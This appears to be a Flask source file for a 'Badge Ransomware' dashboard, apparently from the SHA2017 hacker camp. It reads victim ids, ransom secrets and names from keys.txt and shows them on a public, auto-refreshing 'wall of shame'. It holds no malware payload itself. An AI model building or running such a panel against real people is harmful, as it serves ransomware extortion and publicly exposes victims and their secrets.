from flask import Flask, jsonify
from textwrap import dedent
from contextlib import suppress


app = Flask(__name__)


@app.route("/")
def index():
    return dedent("""
    <DOCTYPE html>
    <html ng-app="sha2017">
        <head>
            <title>SHA2017 - Badge Ransomware</title>
            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
        </head>
        <body ng-controller="ransomware">

            <div class="container">
                <div class="row">
                    <div class="col-sm-6 col-sm-offset-3">
                        <h1 class="text-center">SHA2017 - RANSOMWARE</h1>
                    </div>

                    <div class="col-sm-4 col-sm-offset-4">
                        <div class="form-group">
                            <input type="text" class="form-control text-center" placeholder="Browse poor souls" ng-keyup="applyFilter(me)" ng-model="me">
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-sm-4 col-sm-offset-4">
                        <h3 class="text-center">WALL OF SHAME ({{ owned.length }})</h3>
                    </div>
                </div>

                <div class="row">
                    <div class="col-sm-2 col-sm-offset-3 text-left"><b>User</b></div>
                    <div class="col-sm-2 text-center"><b>Ransom ID</b></div>
                    <div class="col-sm-2 text-right"><b>Ransom Secret</b></div>
                </div>

                <div class="row" ng-repeat="user in owned | filter:filter | reverse">
                    <div class="col-sm-2 col-sm-offset-3 text-left" ng-bind="user.name"></div>
                    <div class="col-sm-2 text-center" ng-bind="user.id"></div>
                    <div class="col-sm-2 text-right" ng-bind="user.secret">********</div>
                </div>
            </div>

            <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.5/angular.min.js"></script>
            <script>
                angular.module("sha2017", []);

                angular.module("sha2017").controller("ransomware", function($http, $scope, $interval) {
                    $scope.owned = [];
                    $scope.filter = "";
                    $scope.applyFilter = function(name) { $scope.filter = name; };
                    function loadPwned() {
                        $http.get("/api/owned").then(function(response) {
                            $scope.owned = response.data;
                        });
                    }
                    $interval(loadPwned, 5000);
                    loadPwned();
                });

                angular.module("sha2017").filter('reverse', function() {
                    return function(items) {
                        return items.slice().reverse();
                    };
                });
            </script>
        </body>
    </html>
    """.strip())


@app.route("/api/owned")
def owned_list():
    users = []

    with open("keys.txt") as file:
        for line in file:
            with suppress(Exception):
                vid, secret, name = line.split(":")
                if name.strip() != "Paradoxis":
                    users.append({"name": name.strip(), "id": vid, "secret": secret})

    return jsonify(users)



if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7000)

